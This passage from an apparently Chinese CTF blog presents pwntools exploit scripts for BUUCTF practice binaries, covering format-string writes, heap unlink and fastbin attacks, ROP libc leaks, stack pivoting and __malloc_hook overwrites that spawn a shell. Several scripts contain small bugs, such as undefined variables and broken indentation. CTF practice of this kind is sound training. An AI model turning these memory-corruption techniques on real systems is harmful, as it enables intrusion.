</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.sendlineafter(":",p32(0x0804C044) + "%10$n")</span><br><span class="line">sh.sendlineafter("passwd","4")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28856,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x53-ZJCTF-2019-EasyHeap"><a href="#0x53-ZJCTF-2019-EasyHeap" class="headerlink" title="0x53 [ZJCTF 2019]EasyHeap"></a>0x53 [ZJCTF 2019]EasyHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easyheap")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","1")</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("Your choice :","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./easyheap")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">free(2)</span><br><span class="line">payload = '/bin/sh\x00'</span><br><span class="line">payload = payload.ljust(0x68,'a')</span><br><span class="line">payload += p64(0x71) + p64(0x6020ad)</span><br><span class="line">edit(1,0x200,payload)</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">payload = '\xaa' * 3 + p64(0) * 4 + p64(elf.got['free'])</span><br><span class="line">edit(3,len(payload) + 0x100,payload)</span><br><span class="line">edit(0,9,p64(elf.plt['system']))</span><br><span class="line">free(1)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x54-ZJCTF-2019-EasyHeap"><a href="#0x54-ZJCTF-2019-EasyHeap" class="headerlink" title="0x54 [ZJCTF 2019]EasyHeap"></a>0x54 [ZJCTF 2019]EasyHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./login")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">payload = "admin\x00"</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">payload = "2jctf_pa5sw0rd\x00"</span><br><span class="line">payload += "aaaabaaac\x00aadaaaeaaafaaagaaahayyyyyyyyyyyyyyyyyyyyyyyyyyy" + p64(0x400E9E)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x55-ciscn-2019-n-5"><a href="#0x55-ciscn-2019-n-5" class="headerlink" title="0x55 ciscn_2019_n_5"></a>0x55 ciscn_2019_n_5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_n_5")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">sh.sendlineafter("name",'111')</span><br><span class="line">offset = 40</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])</span><br><span class="line">sh.sendlineafter("?",payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendlineafter("name",'111')</span><br><span class="line">offset = 40</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">sh.sendlineafter("?",payload)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20141,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x56-ciscn-2019-s-1"><a href="#0x56-ciscn-2019-s-1" class="headerlink" title="0x56 ciscn_2019_s_1"></a>0x56 ciscn_2019_s_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_s_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">sh.sendlineafter("4.show\n",'1')</span><br><span class="line">sh.sendlineafter("index:",str(idx))</span><br><span class="line">sh.sendlineafter("size:",str(size))</span><br><span class="line">sh.recvuntil("gift: ")</span><br><span class="line">data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">sh.sendafter("content:",content)</span><br><span class="line">log.success("idx=" + str(idx) + " | address=" + hex(data))</span><br><span class="line">return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.sendlineafter("4.show\n",'3')</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("4.show\n",'2')</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter("4.show\n",'4')</span><br><span class="line">sh.sendlineafter("index:",str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_s_1")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">chunk_list = 0x6020E0</span><br><span class="line">chunk_size = 0x602060</span><br><span class="line">key2 = 0x6022B8</span><br><span class="line">key1 = 0x6022BC</span><br><span class="line">payload  = p64(0) + p64(0xF1)</span><br><span class="line">payload += p64(chunk_list - 0x18) + p64(chunk_list - 0x10)</span><br><span class="line">payload  = payload.ljust(0xF0,'a')</span><br><span class="line">payload += p64(0xF0)</span><br><span class="line">add(0,0xF8,payload)</span><br><span class="line">add(1,0xF8,'\n')</span><br><span class="line">add(2,0xF8,'\n')</span><br><span class="line">add(3,0xF8,'\n')</span><br><span class="line">add(4,0xF8,'\n')</span><br><span class="line">add(5,0xF8,'\n')</span><br><span class="line">add(6,0xF8,'\n')</span><br><span class="line">payload  = ''</span><br><span class="line">payload  = payload.ljust(0xF0,'a')</span><br><span class="line">payload += p64(0x100 * 5 - 0x10)</span><br><span class="line">edit(4,payload)</span><br><span class="line">free(5)</span><br><span class="line">add(7,0xE8,'\n')</span><br><span class="line">add(8,0xF8,'\n')</span><br><span class="line">add(9,0xF8,'\n')</span><br><span class="line">add(10,0xF8,'\n')</span><br><span class="line">add(11,0xF8,'\n')</span><br><span class="line">add(12,0xF8,'\n')</span><br><span class="line">free(8)</span><br><span class="line">edit(1,p64(0) + p64(key2 - 0x10))</span><br><span class="line">add(13,0xF8,'\n')</span><br><span class="line">edit(0,p64(0) * 3 + p64(chunk_list) + p64(elf.got['__libc_start_main']))</span><br><span class="line">show(1)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">edit(0,p64(chunk_list) + p64(__free_hook) + p64(binsh))</span><br><span class="line">edit(1,p64(system))</span><br><span class="line">free(2)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20152,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x57-fl0ppy-codegate-2016"><a href="#0x57-fl0ppy-codegate-2016" class="headerlink" title="0x57 fl0ppy_codegate_2016"></a>0x57 fl0ppy_codegate_2016</h2><h3 id="经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”"><a href="#经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”" class="headerlink" title="经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“/bin/sh\x00”)"></a>经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“/bin/sh\x00”)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("fl0ppy_codegate_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def choose(idx):</span><br><span class="line">sh.sendlineafter("5. Exit","1")</span><br><span class="line">sh.sendlineafter("Which floppy do you want to use? 1 or 2?",str(idx))</span><br><span class="line">def write(content1,content2):</span><br><span class="line">sh.sendlineafter(">","2")</span><br><span class="line">sh.sendafter(":",content1)</span><br><span class="line">sh.sendafter(":",content2)</span><br><span class="line">def read():</span><br><span class="line">sh.sendlineafter(">","3")</span><br><span class="line">def modify(mode,content):</span><br><span class="line">sh.sendlineafter(">","4")</span><br><span class="line">sh.sendlineafter("Which one do you want to modify? 1 Description | 2 Data",str(mode))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./fl0ppy_codegate_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.27.so")</span><br><span class="line">        choose(2)</span><br><span class="line">        write('a','a' * 0xa)</span><br><span class="line">        modify(1,'a' * 0xa)</span><br><span class="line">        choose(1)</span><br><span class="line">        write("\x11","\x12")</span><br><span class="line">        modify(1,'\x12' * 0x20)</span><br><span class="line">        choose(1)</span><br><span class="line">        read()</span><br><span class="line">        sh.recvuntil("\x12" * 16)</span><br><span class="line">        ebp = u32(sh.recv(4)) + 8</span><br><span class="line">        sh.recvuntil("\x12" * 12)</span><br><span class="line">        libc = u32(sh.recv(4))- 241 - lib.symbols['__libc_start_main']</span><br><span class="line">        system = libc + lib.symbols['system']</span><br><span class="line">        binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">        payload = ''</span><br><span class="line">        payload = p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">        payload = payload.ljust(20,'a')</span><br><span class="line">        payload += p32(ebp + 4)</span><br><span class="line">        payload = payload.ljust(37,'a')</span><br><span class="line">        modify(1,payload)</span><br><span class="line">        log.success("binsh: " + hex(binsh))</span><br><span class="line">        log.success("system: " + hex(system))</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">        log.success("ebp: " + hex(ebp))</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">        sh.sendline("5")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28869,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x58-nsctf-online-2019-pwn1"><a href="#0x58-nsctf-online-2019-pwn1" class="headerlink" title="0x58 nsctf_online_2019_pwn1"></a>0x58 nsctf_online_2019_pwn1</h2><h3 id="覆盖-malloc-hook为one-gadget"><a href="#覆盖-malloc-hook为one-gadget" class="headerlink" title="覆盖__malloc_hook为one_gadget"></a>覆盖__malloc_hook为one_gadget</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input the size:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Input the content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("Input size:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Input new content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">main_arena_offset = lib.symbols['__malloc_hook'] + 0x10</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">main_arena_offset = lib.symbols['__malloc_hook'] + 0x10</span><br><span class="line">payload = p64(0xfbad1880)+p64(0x0)*3+'\x00'</span><br><span class="line">edit(-16,0x28,payload)</span><br><span class="line">sh.recvuntil(24*'\x00')</span><br><span class="line">libc = u64(sh.recv(8)) - lib.symbols['_IO_file_jumps']</span><br><span class="line">log.success("libc_base -> "+hex(libc))</span><br><span class="line">main_arena = libc + main_arena_offset</span><br><span class="line">one_gadget = libc + 0xf1147</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">add(0xF8,"\x11" * 0xE8)</span><br><span class="line">add(0x68,"\x22" * 0x58)</span><br><span class="line">add(0x18,"\x33" * 0x8)</span><br><span class="line">add(0xF8,"\x44" * 0xE8)</span><br><span class="line">add(0x18,"\x55" * 0x10)</span><br><span class="line">free(0)</span><br><span class="line">edit(2,0x18,'\x00' * 0x10 + p64(0x190))</span><br><span class="line">free(3)</span><br><span class="line">payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">payload += '\x66' * (0x68 - 0x8)</span><br><span class="line">payload += p64(0) + p64(0x21)</span><br><span class="line">payload += '\x77' * 0x18</span><br><span class="line">add(0x270,"a"*0x100)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">free(1)</span><br><span class="line">payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">payload += p64(main_arena - 0x1b-8) + p64(main_arena -0x1b-8)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">add(0x60,"aaaaaaaaa")</span><br><span class="line">add(0x60,"\x00" * 3 + p64(one_gadget))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node2.buuoj.cn.wetolink.com",28275,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x59-nsctf-online-2019-pwn2"><a href="#0x59-nsctf-online-2019-pwn2" class="headerlink" title="0x59 nsctf_online_2019_pwn2"></a>0x59 nsctf_online_2019_pwn2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 